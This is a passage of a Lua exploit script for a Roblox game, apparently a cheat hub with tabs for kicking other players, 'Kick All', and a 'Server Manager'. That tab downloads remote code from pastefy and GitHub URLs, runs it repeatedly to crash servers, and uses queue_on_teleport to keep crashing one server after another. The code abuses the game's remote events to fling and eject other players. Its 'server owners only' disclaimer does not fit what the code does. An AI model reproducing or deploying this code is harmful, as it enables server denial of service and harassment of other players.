                                        if myLoopId ~= orbitCurrentLoopIdV2 or not orbitRunningV2 or not blobman or not blobman.Parent then break end
                                        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                                            local currentTRoot = target.Character.HumanoidRootPart
                                            blobRoot.CFrame = currentTRoot.CFrame
                                            blobRoot.AssemblyLinearVelocity = Vector3.zero
                                            pcall(function()
                                                if Det then grabRemote:FireServer(Det, currentTRoot, Weld) end
                                                GE.CreateGrabLine:FireServer(currentTRoot, Vector3.zero, currentTRoot.Position, false)
                                                GE.SetNetworkOwner:FireServer(currentTRoot, blobRoot.CFrame)
                                            end)
                                        end
                                        RunService.Heartbeat:Wait()
                                    end
                                    lastTime = tick()
                                    lastDropTime = tick()
                                end
                                if tRoot and tHum and tHum.Health > 0 and blobRoot then
                                    local currentTime = tick()
                                    local dt = currentTime - lastTime
                                    lastTime = currentTime
                                    orbitAngleV2 = orbitAngleV2 + (orbitSpeed * dt)
                                    local offsetX = math.cos(orbitAngleV2) * orbitRadius
                                    local offsetZ = math.sin(orbitAngleV2) * orbitRadius
                                    local blobPos = targetCenterCFrame.Position + Vector3.new(offsetX, orbitHeightOffset, offsetZ)
                                    blobRoot.CFrame = CFrame.new(blobPos, targetCenterCFrame.Position)
                                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                                    blobRoot.AssemblyAngularVelocity = Vector3.zero
                                    tRoot.CFrame = targetCenterCFrame
                                    tRoot.AssemblyLinearVelocity = Vector3.zero
                                    tRoot.AssemblyAngularVelocity = Vector3.zero
                                    pcall(function()
                                        tHum.PlatformStand = true
                                        tHum.Sit = true
                                        GE.SetNetworkOwner:FireServer(tRoot, targetCenterCFrame)
                                        local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                                        if currentWeld then dropRemote:FireServer(currentWeld) end
                                        GE.DestroyGrabLine:FireServer(tRoot)
                                        if Det then grabRemote:FireServer(Det, tRoot, Weld) end
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, targetCenterCFrame.Position, false)
                                    end)
                                else
                                    break
                                end
                                RunService.Heartbeat:Wait()
                            end
                            if blobRoot and SavedPos then
                                pcall(function()
                                    local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                                    if currentWeld then dropRemote:FireServer(currentWeld) end
                                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                                        GE.DestroyGrabLine:FireServer(target.Character.HumanoidRootPart)
                                    end
                                end)
                                blobRoot.CFrame = SavedPos
                                blobRoot.AssemblyLinearVelocity = Vector3.zero
                            end
                        end)
                    else
                        PlayErrorSound()
                        OrionLib:MakeNotification({ Name = "Error", Content = "Required RemoteEvents or detectors not found", Time = 5 })
                        orbitRunningV2 = false
                    end
                else
                    PlayErrorSound()
                    OrionLib:MakeNotification({ Name = "Error", Content = "Failed to get/spawn Blobman", Time = 3 })
                    orbitRunningV2 = false
                end
            else
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Invalid target", Time = 3 })
                orbitRunningV2 = false
            end
        end
    })

    AttackTab:AddSection({ Name = "Send Flying" })

    local BlobmanBeta = {}
    function BlobmanBeta.getLocalChar() return LocalPlayer.Character end
    function BlobmanBeta.getLocalRoot()
        local char = BlobmanBeta.getLocalChar()
        return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso"))
    end
    function BlobmanBeta.getLocalHum()
        local char = BlobmanBeta.getLocalChar()
        return char and char:FindFirstChildOfClass("Humanoid")
    end
    function BlobmanBeta.getInv() return Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys") end
    function BlobmanBeta.SetNetworkOwner(part)
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, BlobmanBeta.getLocalRoot().CFrame)
    end
    function BlobmanBeta.ungrab(part)
        ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(part)
    end
    function BlobmanBeta.getBlobman()
        local inv = BlobmanBeta.getInv()
        if inv then
            local v = inv:FindFirstChild("CreatureBlobman")
            if v and v:FindFirstChild("VehicleSeat") then return v end
        end
        for _, p in Workspace.PlotItems:GetChildren() do
            local m = p:FindFirstChild("CreatureBlobman")
            if m and m:FindFirstChild("PlayerValue") and m.PlayerValue.Value == LocalPlayer.Name then
                return m
            end
        end
        return nil
    end
    function BlobmanBeta.spawnBlobman()
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", BlobmanBeta.getLocalRoot().CFrame, Vector3.zero)
        task.wait(1.0)
        return BlobmanBeta.getBlobman()
    end
    function BlobmanBeta.destroyBlobman()
        local blob = BlobmanBeta.getBlobman()
        if blob then ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob) end
    end
    function BlobmanBeta.isSittingOnBlobman()
        local hum = BlobmanBeta.getLocalHum()
        if not hum then return false end
        local blob = BlobmanBeta.getBlobman()
        if not blob or not blob:FindFirstChild("VehicleSeat") then return false end
        return hum.Sit and hum.SeatPart == blob.VehicleSeat
    end
    function BlobmanBeta.ensureSitBlobman()
        local blob = BlobmanBeta.getBlobman()
        if not blob or not blob:FindFirstChild("VehicleSeat") then return false end
        local seat = blob.VehicleSeat
        local hum = BlobmanBeta.getLocalHum()
        if hum and not hum.Sit then
            seat:Sit(hum)
            task.wait(0.6)
        end
        return BlobmanBeta.isSittingOnBlobman()
    end
    function BlobmanBeta.blobGrab(blob, target, side)
        if not blob then return end
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then return end
        local weld = detector:FindFirstChild(side .. "Weld")
        if not weld then return end
        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
        if not script then return end
        local remote = script:FindFirstChild("CreatureGrab")
        if remote then pcall(function() remote:FireServer(detector, target, weld) end) end
    end
    function BlobmanBeta.blobDrop(blob, target, side)
        if not blob then return end
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then return end
        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
        if not script then return end
        local remote = script:FindFirstChild("CreatureDrop")
        if remote then pcall(function() remote:FireServer(detector, target) end) end
    end
    function BlobmanBeta.blobKick(blob, targetRoot, side)
        BlobmanBeta.blobGrab(blob, BlobmanBeta.getLocalRoot(), side)
        task.wait(0.08)
        BlobmanBeta.SetNetworkOwner(targetRoot)
        task.wait(0.08)
        targetRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 16, 0)
        task.wait(0.08)
        BlobmanBeta.ungrab(targetRoot)
        task.wait(0.08)
        BlobmanBeta.blobGrab(blob, targetRoot, side)
        task.wait(0.08)
        BlobmanBeta.blobDrop(blob, targetRoot, side)
        task.wait(0.08)
        BlobmanBeta.ungrab(targetRoot)
    end

    local isExecuting = false
    local selectedV3Player = nil

    local function UpdateV3PlayerList(Dropdown)
        local playerNames = {}
        for _, plr in Players:GetPlayers() do
            if plr ~= LocalPlayer then table.insert(playerNames, plr.Name) end
        end
        Dropdown:Refresh(playerNames, true)
    end

    local function KickSelectedV3Player()
        if isExecuting then
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Already executing...", Time = 3})
            return
        end
        if not selectedV3Player then
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Please select a player first", Time = 3})
            return
        end
        local targetPlayer = Players:FindFirstChild(selectedV3Player)
        if not targetPlayer then
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Player not found", Time = 3})
            return
        end
        local targetChar = targetPlayer.Character
        if not targetChar then
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Target has no character", Time = 3})
            return
        end
        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        if not targetRoot then
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Target has no HumanoidRootPart", Time = 3})
            return
        end
        isExecuting = true
        PlayActionSound()
        local function doKick()
            local blob = BlobmanBeta.getBlobman()
            if not blob then
                blob = BlobmanBeta.spawnBlobman()
                if not blob then
                    PlayErrorSound()
                    OrionLib:MakeNotification({Name = "Error", Content = "Failed to spawn Blobman", Time = 5})
                    return false
                end
            end
            if not BlobmanBeta.isSittingOnBlobman() then
                BlobmanBeta.ensureSitBlobman()
                if not BlobmanBeta.isSittingOnBlobman() then
                    PlayErrorSound()
                    OrionLib:MakeNotification({Name = "Error", Content = "Not sitting on Blobman", Time = 4})
                    return false
                end
            end
            local myRoot = BlobmanBeta.getLocalRoot()
            if myRoot and targetRoot then
                local oldPos = myRoot.CFrame
                myRoot.CFrame = targetRoot.CFrame
                task.wait(0.07)
                BlobmanBeta.blobKick(blob, targetRoot, "Left")
                task.wait(0.25)
                myRoot.CFrame = oldPos
            end
            BlobmanBeta.destroyBlobman()
            OrionLib:MakeNotification({Name = "Success", Content = "Sent " .. targetPlayer.Name .. " flying!", Time = 5})
            return true
        end
        doKick()
        isExecuting = false
    end

    local V3PlayerDropdown = AttackTab:AddDropdown({
        Name = "Select Player",
        Options = {},
        Callback = function(value) selectedV3Player = value end
    })

    AttackTab:AddButton({
        Name = "Refresh Player List",
        Callback = function()
            PlayActionSound()
            UpdateV3PlayerList(V3PlayerDropdown)
        end
    })

    AttackTab:AddButton({
        Name = "Send Flying!",
        Callback = KickSelectedV3Player
    })

    AttackTab:AddSection({ Name = "Send Flying Additional Features" })
    local InfiniteJumpV3Enabled = false
    UserInputService.JumpRequest:Connect(function()
        if InfiniteJumpV3Enabled then
            local hum = BlobmanBeta.getLocalHum()
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end
    end)

    AttackTab:AddToggle({
        Name = "Infinite Jump",
        Default = false,
        Callback = function(Value)
            InfiniteJumpV3Enabled = Value
            if Value then PlayActionSound() end
        end
    })

    AttackTab:AddToggle({
        Name = "Third Person View",
        Default = false,
        Callback = function(Value)
            if Value then
                PlayActionSound()
                LocalPlayer.CameraMaxZoomDistance = 100
                LocalPlayer.CameraMinZoomDistance = 10
            else
                LocalPlayer.CameraMaxZoomDistance = 12.5
                LocalPlayer.CameraMinZoomDistance = 0.5
            end
        end
    })

    AttackTab:AddSection({ Name = "Kick All" })

    local currentBlob = nil
    local isKickAllActive = false
    local playerStatus = {}
    local whitelistFriends = false

    local function GetAllPlayers()
        local players = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local isFriend = false
                if whitelistFriends then
                    pcall(function() isFriend = LocalPlayer:IsFriendsWith(player.UserId) end)
                end
                if not isFriend then table.insert(players, player) end
            end
        end
        return players
    end

    local function GetMyRoot()
        return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end

    local function ResetTargets()
        for id, status in pairs(playerStatus) do
            if status == "Targeted" then playerStatus[id] = nil end
        end
    end

    local function KickAll()
        if isKickAllActive then return end
        isKickAllActive = true
        local allPlayers = GetAllPlayers()
        if #allPlayers == 0 then 
            PlayErrorSound()
            OrionLib:MakeNotification({ Name = "No Targets", Content = "No players available to kick.", Image = "rbxassetid://4483345998", Time = 3 })
            isKickAllActive = false
            return 
        end
        PlayActionSound()
        for _, targetPlayer in ipairs(allPlayers) do
            playerStatus[targetPlayer.UserId] = "Targeted"
        end
        local rootPart = GetMyRoot()
        if rootPart then
            local spawnPos = rootPart.CFrame * CFrame.new(0, 0, -5)
            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", spawnPos, Vector3.new(0, 127, 0))
        end
        task.wait(0.5)
        local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
        currentBlob = toyFolder and toyFolder:FindFirstChild("CreatureBlobman")
        if not currentBlob then 
            PlayErrorSound()
            ResetTargets()
            isKickAllActive = false
            return 
        end
        local vehicleSeat = currentBlob:FindFirstChild("VehicleSeat")
        if vehicleSeat and LocalPlayer.Character then
            vehicleSeat:Sit(LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
        end
        task.wait(0.3)
        local myRoot = GetMyRoot()
        if not myRoot then 
            PlayErrorSound()
            ResetTargets()
            isKickAllActive = false
            return 
        end
        for _, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                myRoot.CFrame = targetRoot.CFrame
                task.wait(0.02)
                for i = 1, 5 do
                    pcall(function()
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(currentBlob.LeftDetector.LeftWeld)
                    end)
                    if i < 5 then task.wait(0.08) end
                end
            end
        end
        myRoot.CFrame = CFrame.new(0, 100, 0)
        task.wait(0.1)
        for _, part in ipairs(currentBlob:GetDescendants()) do
            if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
        end
        task.wait(0.1)
        local radius = 15
        for i, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local angle = math.rad((i - 1) * (360 / #allPlayers))
                local x = radius * math.cos(angle)
                local z = radius * math.sin(angle)
                targetRoot.CFrame = CFrame.new(x, 110, z)
            end
        end
        task.wait(0.1)
        for _ = 1, 2 do
            for _, targetPlayer in ipairs(allPlayers) do
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    task.spawn(function()
                        pcall(function()
                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(targetRoot, CFrame.new(targetRoot.Position))
                            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(targetRoot)
                        end)
                    end)
                end
            end
            task.wait(0.1)
        end
        task.wait(0.3)
        for _, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                task.spawn(function()
                    pcall(function()
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld)
                    end)
                end)
            end
        end
        task.wait(0.1)
        for _, targetPlayer in ipairs(allPlayers) do
            if targetPlayer and targetPlayer.Parent == Players then
                playerStatus[targetPlayer.UserId] = "Kicked"
            end
        end
        myRoot.CFrame = CFrame.new(0, -50000, 0)
        for _, part in ipairs(currentBlob:GetDescendants()) do
            if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
        end
        task.wait(1)
        isKickAllActive = false
    end

    AttackTab:AddButton({ Name = "Kick All", Callback = KickAll })

    AttackTab:AddToggle({
        Name = "Exclude Friends",
        Default = false,
        Callback = function(Value)
            whitelistFriends = Value
            if Value then PlayActionSound() end
        end    
    })

    AttackTab:AddParagraph("Status", "Current state information")
    local statusTargetLabel = AttackTab:AddLabel("Current Target V1: None")
    local statusRunningLabel = AttackTab:AddLabel("Status V1: Stopped")

    task.spawn(function()
        while task.wait(1) do
            if selectedKickPlayer then
                statusTargetLabel:Set("Current Target V1: " .. selectedKickPlayer.Name)
            else
                statusTargetLabel:Set("Current Target V1: None")
            end
            statusRunningLabel:Set(kickLoopEnabled and "Status V1: Running" or "Status V1: Stopped")
        end
    end)

    AttackTab:AddSection({ Name = "Sphere Orbit Kick V1" })

    local sphereTargetMap = {}
    local function getSpherePlayerNames()
        local names = {}
        sphereTargetMap = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local displayStr = player.DisplayName .. " (@ " .. player.Name .. ")"
                table.insert(names, displayStr)
                sphereTargetMap[displayStr] = player.Name
            end
        end
        return names
    end

    local sphereTargetDropdown = AttackTab:AddDropdown({
        Name = "Target Player",
        Default = "",
        Options = getSpherePlayerNames(),
        Callback = function(value)
            local name = sphereTargetMap[value] or ""
            if name == "" then PlayErrorSound() end
            _G._SphereOrbitTarget = name
        end
    })

    AttackTab:AddButton({
        Name = "Refresh Player List",
        Callback = function()
            PlayActionSound()
            sphereTargetDropdown:Refresh(getSpherePlayerNames(), true)
        end
    })

    AttackTab:AddButton({
        Name = "🚀 Execute (Sphere Orbit Kick)",
        Callback = function()
            local targetName = _G._SphereOrbitTarget or ""
            if targetName == "" then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Please select a target", Time = 3 })
                return
            end
            SphereOrbitKick.kick(targetName)
        end
    })

    AttackTab:AddButton({
        Name = "⏹ Stop",
        Callback = function()
            SphereOrbitKick.stop()
        end
    })

    AttackTab:AddSlider({ Name = "Orbit Radius", Min = 5, Max = 30, Default = 12, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SphereOrbitKick.setRadius(v) end })
    AttackTab:AddSlider({ Name = "Orbit Speed", Min = 10, Max = 150, Default = 60, Color = Theme.SliderColor, Increment = 5, ValueName = "speed", Callback = function(v) SphereOrbitKick.setSpeed(v) end })
    AttackTab:AddSlider({ Name = "Float Height", Min = 2, Max = 30, Default = 10, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SphereOrbitKick.setHeight(v) end })
    AttackTab:AddSlider({ Name = "Sphere Tilt", Min = 0.1, Max = 1.5, Default = 0.9, Color = Theme.SliderColor, Increment = 0.1, ValueName = "tilt", Callback = function(v) SphereOrbitKick.setTilt(v) end })
    AttackTab:AddSlider({ Name = "Orbit Complexity", Min = 0.1, Max = 2.0, Default = 0.7, Color = Theme.SliderColor, Increment = 0.1, ValueName = "complexity", Callback = function(v) SphereOrbitKick.setComplexity(v) end })
    AttackTab:AddToggle({ Name = "Show Effects", Default = true, Callback = function(v)
        SphereOrbitKick.setEffects(v)
        if v then PlayActionSound() end
    end })

    AttackTab:AddParagraph("Description", 
        "Sphere Orbit Kick V1\n" ..
        "Rapidly rotates in a 3D spherical orbit around the target,\n" ..
        "delivering a powerful drift kick.\n" ..
        "Rotates 360 degrees in all X, Y, Z directions."
    )
end

-- ============================================================================
-- ブロック31.5 [EN]: Server Manager（英語版）
-- 攻撃系タブ（ブロック31）の直後に挿入
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TextChatService = game:GetService("TextChatService")
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")

    -- ========================================================================
    -- Constants
    -- ========================================================================
    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- Standalone crash (35 runs)
    local AUTOLOGIC_URL = "https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/server-crash"  -- Infinite loop
    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
    local CRASH_LOOP_COUNT = 35

    -- ========================================================================
    -- HTTP fetch
    -- ========================================================================
    local function safeHttpGet(url)
        if type(game.HttpGet) == "function" then
            return game:HttpGet(url)
        elseif type(HttpGet) == "function" then
            return HttpGet(url)
        elseif type(game.HttpGet) == "function" then
            return game.HttpGet(game, url)
        end
        error("HttpGet not available in this environment")
    end

    -- ========================================================================
    -- Chat send (2 methods: TextChatService + Legacy)
    -- ========================================================================
    local function sendChatMessage(message)
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            pcall(function()
                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
                gc:SendAsync(message)
            end)
        end
        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if events then
            local smr = events:FindFirstChild("SayMessageRequest")
            if smr then
                pcall(function() smr:FireServer(message, "All") end)
            end
        end
    end

    -- ========================================================================
    -- Run crash script (standalone, 35 times)
    -- ========================================================================
    local function runCrashScript()
        local ok, err = pcall(function()
            local scriptContent = safeHttpGet(CRASH_URL)
            for i = 1, CRASH_LOOP_COUNT do
                pcall(function()
                    loadstring(scriptContent)()
                end)
                task.wait(0.1)
            end
        end)
        return ok, err
    end

    -- ========================================================================
    -- Get another server's JobId
    -- ========================================================================
    local function getAnotherServerJobId()
        local ok, result = pcall(function()
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
                game.PlaceId
            )
            return HttpService:JSONDecode(safeHttpGet(url))
        end)
        if ok and result and result.data then
            local currentJobId = game.JobId
            for _, server in ipairs(result.data) do
                if server.id and server.id ~= currentJobId then
                    return server.id
                end
            end
        end
        return nil
    end

    -- ========================================================================
    -- Teleport
    -- ========================================================================
    local function teleportToAnotherServer()
        local targetJobId = getAnotherServerJobId()
        local localPlayer = Players.LocalPlayer
        if targetJobId then
            local ok = pcall(function()
                local opts = Instance.new("TeleportOptions")
                opts.ServerInstanceId = targetJobId
                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
            end)
            if ok then return true end
        end
        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
        return false
    end

    -- ========================================================================
    -- Countdown (single run)
    -- ========================================================================
    local function runCountdownOnce(onFinish)
        task.spawn(function()
            pcall(function() sendChatMessage(CHAT_HEADER) end)
            task.wait(0.8)
            pcall(function() sendChatMessage("5") end) task.wait(1)
            pcall(function() sendChatMessage("4") end) task.wait(1)
            pcall(function() sendChatMessage("3") end) task.wait(1)
            pcall(function() sendChatMessage("2") end) task.wait(1)
            pcall(function() sendChatMessage("1") end)
            if onFinish then onFinish() end
        end)
    end

    -- ========================================================================
    -- queue_on_teleport support check
    -- ========================================================================
    local function hasQueueOnTeleport()
        return (type(queue_on_teleport) == "function")
            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
    end

    local function callQueueOnTeleport(script)
        if type(queue_on_teleport) == "function" then
            return pcall(function() queue_on_teleport(script) end)
        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
            return pcall(function() syn.queue_on_teleport(script) end)
        end
        return false
    end

    -- ========================================================================
    -- Create tab
    -- ========================================================================
    local CrashTab = Window:MakeTab({
        Name = "Server Manager",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    CrashTab:AddParagraph(
        "⚠️ Do not abuse",
        "Test feature for server owners.\n" ..
        "Do not run on other people's servers."
    )

    CrashTab:AddSection({ Name = "Test Execution" })

    CrashTab:AddButton({
        Name = "⚡ Server Crash Test (standalone, 35 consecutive runs)",
        Callback = function()
            PlayActionSound()
            OrionLib:MakeNotification({
                Name = "Standalone Crash Test",
                Content = "Starting 35 consecutive runs...",
                Time = 3
            })
            task.spawn(function()
                local ok, err = runCrashScript()
                if ok then
                    PlayActionSound()
                    OrionLib:MakeNotification({
                        Name = "Complete",
                        Content = "Finished 35 runs",
                        Time = 5
                    })
                else
                    PlayErrorSound()
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Failed: " .. tostring(err),
                        Time = 5
                    })
                end
            end)
        end
    })

    -- ========================================================================
    -- ② Auto infinite mode
    --    1st run (this server):
    --      Countdown → queue server-crash on queue_on_teleport
    --      Fire teleport → run sPciZuXM (35 times) on this server
    --    2nd+ (new server):
    --      server-crash auto-loads → countdown · crash · teleport · self-queue
    -- ========================================================================
    CrashTab:AddButton({
        Name = "🔁 Auto Crash Mode (infinite loop)",
        Callback = function()
            PlayActionSound()

            if not hasQueueOnTeleport() then
                PlayErrorSound()
                OrionLib:MakeNotification({
                    Name = "❌ Cannot Execute",
                    Content = "This executor does not support queue_on_teleport. Infinite loop is not possible.",
                    Time = 8
                })
                return
            end

            OrionLib:MakeNotification({
                Name = "🔁 Auto Mode",
                Content = "Starting countdown → this server will also run 35 crash runs",
                Time = 3
            })

            runCountdownOnce(function()
                -- Queue server-crash (URL load only) for the next server
                local nextScript = string.format([[
loadstring(game:HttpGet("%s"))()
]], AUTOLOGIC_URL)
                local ok = callQueueOnTeleport(nextScript)
                if not ok then
                    PlayErrorSound()
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Failed to queue on queue_on_teleport",
                        Time = 4
                    })
                    return
                end

                -- Fire teleport first (so it is not affected by crash)
                task.spawn(function() teleportToAnotherServer() end)
                task.wait(0.1)

                -- Also run sPciZuXM (35 times) on this server
                task.spawn(function()
                    local crashOk = runCrashScript()
                    if crashOk then
                        PlayActionSound()
                        OrionLib:MakeNotification({
                            Name = "First Crash Run",
                            Content = "server-crash queued · Moving to another server",
                            Time = 4
                        })
                    else
                        PlayErrorSound()
                    end
                end)
            end)
        end
    })

    -- ========================================================================
    -- Information
    -- ========================================================================
    CrashTab:AddSection({ Name = "Information" })
    CrashTab:AddParagraph(
        "Usage",
        "① Standalone: runs sPciZuXM 35 times (completes on this server)\n" ..
        "② Auto infinite: countdown → queue server-crash → fire teleport → run 35 crash runs on this server\n" ..
        "   After arriving on the new server, server-crash automatically performs countdown · crash · teleport · self-queue,\n" ..
        "   creating an infinite loop."
    )
    CrashTab:AddParagraph(
        "URLs Used",
        "・Standalone Crash: " .. CRASH_URL .. "\n" ..
        "・Infinite Loop: " .. AUTOLOGIC_URL
    )
    CrashTab:AddParagraph(
        "Notes",
        "・Executors without queue_on_teleport cannot run the infinite loop\n" ..
        "・If public servers run out, Teleport() fallback is used\n" ..
        "・Continuous teleport + crash violates Roblox ToS (at your own risk)"
    )
end

-- ============================================================================
-- Block 32: Hijack Train Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local ReplicatedStorage = _G.ReplicatedStorage
    local Players = _G.Players
    local Workspace = _G.Workspace
    local LocalPlayer = _G.LocalPlayer

    local TrainTab = Window:MakeTab({ Name = "Hijack Train", Icon = "rbxassetid://4483345998", PremiumOnly = false })

    local AutomationEnabled = false
    local AutomationConnection = nil
    local TargetItemName = "InstrumentWoodwindOcarina"
    local SecondItemName = "FoodMayonnaise"
    local occupiedSeats = {}
    local seatConnections = {}
    local firstTimeRiders = {}
    local allSeats = {}

    local function getAllItemsWithRemote()
        local items = {}
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("RemoteFunction") and obj.Name == "HoldItemRemoteFunction" then
                local holdPart = obj.Parent
                if holdPart and holdPart.Name == "HoldPart" then
                    local item = holdPart.Parent
                    if item then
                        local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
                        table.insert(items, { Name = item.Name, Object = item, RemoteFunction = obj, DropRemoteFunction = dropRemote })
                    end
                end
            end
        end
        return items
    end

    local function getPlayerCharacter()
        return Workspace:FindFirstChild(LocalPlayer.Name .. "_sub") or Workspace:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
    end

    local function holdItem(itemData)
        local char = getPlayerCharacter()
        if char and itemData and itemData.RemoteFunction then
            pcall(function() itemData.RemoteFunction:InvokeServer(itemData.Object, char) end)
        end
    end

    local function useItem(itemData)
        pcall(function()
            local UseRemote = ReplicatedStorage:FindFirstChild("HoldEvents")
            if UseRemote then
                local Use = UseRemote:FindFirstChild("Use")
                if Use then Use:FireServer(itemData.Object) end
            end
        end)
    end

    local function dropItemHigh(itemData)
        local char = getPlayerCharacter()
        if char and itemData and itemData.DropRemoteFunction then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                pcall(function()
                    itemData.DropRemoteFunction:InvokeServer(itemData.Object, root.CFrame * CFrame.new(0, 900, 0), Vector3.new(0, 900, 0))
                end)
            end
        end
    end

    local function spawnItem(itemName)
        local char = getPlayerCharacter()
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            local SpawnToyRemote = ReplicatedStorage:FindFirstChild("MenuToys")
            if SpawnToyRemote then
                local SpawnFunc = SpawnToyRemote:FindFirstChild("SpawnToyRemoteFunction")
                if SpawnFunc then
                    SpawnFunc:InvokeServer(itemName, CFrame.new(root.Position + Vector3.new(0, 900, 0)), Vector3.new(0, 0, 0))
                end
            end
        end)
    end

    local function findTargetItem()
        for _, item in pairs(getAllItemsWithRemote()) do
            if item.Name == TargetItemName then return item end
        end
        return nil
    end

    local function findSecondItem()
        for _, item in pairs(getAllItemsWithRemote()) do
            if item.Name == SecondItemName then return item end
        end
        return nil
    end

    local function performAutoAction(isFirstTime)
        if isFirstTime then
            if not findTargetItem() then spawnItem(TargetItemName) end
            if not findSecondItem() then spawnItem(SecondItemName) end
            task.wait(1.0)
            local target = findTargetItem()
            local second = findSecondItem()
            if target then holdItem(target) task.wait(0.1) end
            if second then holdItem(second) task.wait(0.1) end
            if target then useItem(target) task.wait(0.1) end
            if target then dropItemHigh(target) task.wait(0.1) end
            if second then dropItemHigh(second) end
        else
            local target = findTargetItem()
            if not target then
                spawnItem(TargetItemName)
                task.wait(1.0)
                target = findTargetItem()
            end
            if target then
                holdItem(target)
                task.wait(0.3)
                dropItemHigh(target)
            end
        end
    end

    local function setupSeat(seat)
        local conn = seat:GetPropertyChangedSignal("Occupant"):Connect(function()
            local humanoid = seat.Occupant
            if humanoid then
                local player = Players:GetPlayerFromCharacter(humanoid.Parent)
                if player then
                    occupiedSeats[seat] = player
                    if AutomationEnabled then
                        local isFirst = not firstTimeRiders[player.UserId]
                        if isFirst then firstTimeRiders[player.UserId] = true end
                        performAutoAction(isFirst)
                    end
                end
                local sitConn
                sitConn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
                    if not humanoid.Sit and player then
                        occupiedSeats[seat] = nil
                        if AutomationEnabled then performAutoAction(false) end
                        if sitConn then sitConn:Disconnect() end
                    end
                end)
            end
        end)
        seatConnections[seat] = conn
        table.insert(allSeats, seat)
    end

    local function startSeatDetection()
